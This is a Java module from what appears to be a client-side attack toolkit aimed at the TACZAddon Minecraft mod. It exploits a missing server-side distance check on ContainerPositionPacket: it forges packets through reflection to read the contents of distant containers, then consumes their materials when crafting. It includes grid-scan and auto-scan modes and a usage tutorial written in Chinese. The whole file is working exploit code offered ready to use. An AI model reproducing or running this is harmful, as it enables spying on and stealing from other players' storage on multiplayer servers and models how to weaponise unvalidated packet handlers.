package com.redblue.red.modules.taczaddon;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.network.chat.Component;
import net.minecraftforge.fml.ModList;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.lang.reflect.Constructor;
import java.util.List;

/**
 * TACZAddon Vuln #2 + #4: ContainerPositionPacket remote container spy & material theft.
 *
 * The server handler has NO distance check on the BlockPos sent by the client.
 * It scans a 5x3x5 area around the given position, reads all container contents,
 * sends them back to the client (ContainerReaderPacket), AND writes the coordinates
 * into the player's PersistentData ("BetterGunSmithTable.nearbyContainerPos").
 *
 * Later, when the player crafts at a GunSmithTable, GunSmithTableMenuMixin reads
 * those persisted coordinates and consumes materials from the remote containers.
 *
 * Attack chain:
 *   1. Send ContainerPositionPacket with target coords -> spy on remote containers
 *   2. Open GunSmithTable and craft -> materials consumed from remote containers
 */
public class TACZADD02_RemoteContainer implements AttackModule {

    private static final Logger LOGGER = LoggerFactory.getLogger("TACZADD02");

    private static final String NETWORK_HANDLER_CLASS =
            "com.mafuyu404.taczaddon.init.NetworkHandler";
    private static final String CHANNEL_FIELD = "CHANNEL";
    private static final String PACKET_CLASS =
            "com.mafuyu404.taczaddon.network.ContainerPositionPacket";

    private static boolean reflectionResolved = false;
    private static Constructor<?> packetCtor;

    private long lastTick = 0;

    private final List<ConfigParam> params = List.of(
            ConfigParam.ofBool("enabled", "启用", false),
            ConfigParam.ofEnum("coord_source", "坐标来源",
                    "CUSTOM", "CUSTOM", "CROSSHAIR"),
            ConfigParam.ofBlock("target_pos", "目标坐标"),
            ConfigParam.ofBool("auto_scan", "自动扫描（刻）", false),
            ConfigParam.ofInt("scan_interval", "扫描间隔（刻）", 100, 20, 1200)
                    .visibleWhen("auto_scan", "true"),
            ConfigParam.ofBool("scan_grid", "网格扫描模式", false),
            ConfigParam.ofInt("grid_step", "网格步长（格）", 5, 1, 32)
                    .visibleWhen("scan_grid", "true"),
            ConfigParam.ofInt("grid_radius", "网格半径（步）", 3, 1, 20)
                    .visibleWhen("scan_grid", "true")
    );

    @Override public String id() { return "taczadd02_remote_container"; }
    @Override public String name() { return "远程容器访问"; }
    @Override public String description() {
        return "绕过距离限制远程访问弹药容器";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
             + "1. 选择坐标来源：CUSTOM（手动输入坐标）或 CROSSHAIR（准星指向方块）\n"
             + "2. 设置目标坐标后点击执行\n"
             + "3. 扫描完成后打开枪匠台即可使用远程容器中的材料合成\n\n"
             + "[参数说明]\n"
             + "CUSTOM：手动输入目标坐标\n"
             + "CROSSHAIR：使用准星指向的方块坐标\n"
             + "网格扫描模式：围绕目标坐标按网格批量扫描，覆盖更大范围\n\n"
             + "[注意事项]\n"
             + "扫描到的坐标会持久化存储，重启服务器后仍然有效\n"
             + "网格扫描会发送大量数据包，请合理设置步长和半径";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("taczaddon");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;

        BlockPos target = resolveTargetPos(mc);
        if (target == null) {
            chat(mc, "\u00a7c[TACZADD02] No target position set");
            return;
        }

        boolean gridMode = getParam("scan_grid").map(ConfigParam::getBool).orElse(false);
        if (gridMode) {
            executeGridScan(mc, target);
        } else {
            sendContainerPositionPacket(mc, target);
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        boolean autoScan = getParam("auto_scan").map(ConfigParam::getBool).orElse(false);
        if (!autoScan) return;

        int interval = getParam("scan_interval").map(ConfigParam::getInt).orElse(100);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        execute(mc);
    }

    private BlockPos resolveTargetPos(Minecraft mc) {
        String source = getParam("coord_source").map(ConfigParam::getString).orElse("CUSTOM");
        if ("CROSSHAIR".equals(source)) {
            if (mc.hitResult instanceof net.minecraft.world.phys.BlockHitResult bhr) {
                return bhr.getBlockPos();
            }
            return null;
        }
        // CUSTOM: read from BLOCK param
        long packed = getParam("target_pos").map(ConfigParam::getLong).orElse(0L);
        if (packed == 0L) return null;
        return BlockPos.of(packed);
    }

    private void executeGridScan(Minecraft mc, BlockPos center) {
        int step = getParam("grid_step").map(ConfigParam::getInt).orElse(5);
        int radius = getParam("grid_radius").map(ConfigParam::getInt).orElse(3);
        int count = 0;

        for (int dx = -radius; dx <= radius; dx++) {
            for (int dz = -radius; dz <= radius; dz++) {
                BlockPos pos = center.offset(dx * step, 0, dz * step);
                sendContainerPositionPacket(mc, pos);
                count++;
            }
        }
        chat(mc, "\u00a7a[TACZADD02] Grid scan sent " + count + " packets around "
                + center.toShortString());
    }

    private void sendContainerPositionPacket(Minecraft mc, BlockPos pos) {
        resolveReflection();
        if (packetCtor == null) {
            chat(mc, "\u00a7c[TACZADD02] Reflection failed - taczaddon not loaded?");
            return;
        }

        try {
            Object packet = packetCtor.newInstance(pos);
            boolean ok = PacketForge.sendViaChannel(
                    NETWORK_HANDLER_CLASS, CHANNEL_FIELD, packet);
            if (ok) {
                chat(mc, "\u00a7a[TACZADD02] Sent ContainerPositionPacket("
                        + pos.getX() + ", " + pos.getY() + ", " + pos.getZ() + ")");
            } else {
                chat(mc, "\u00a7c[TACZADD02] Send failed");
            }
        } catch (Exception e) {
            LOGGER.error("[TACZADD02] Send failed", e);
            chat(mc, "\u00a7c[TACZADD02] Error: " + e.getMessage());
        }
    }

    private static synchronized void resolveReflection() {
        if (reflectionResolved) return;
        reflectionResolved = true;
        try {
            Class<?> clz = Class.forName(PACKET_CLASS);
            packetCtor = clz.getDeclaredConstructor(BlockPos.class);
            packetCtor.setAccessible(true);
            LOGGER.info("[TACZADD02] Reflection resolved");
        } catch (Exception e) {
            LOGGER.error("[TACZADD02] Reflection failed", e);
        }
    }

    private static void chat(Minecraft mc, String msg) {
        if (mc.player != null) {
            mc.player.displayClientMessage(Component.literal(msg), false);
        }
    }
}
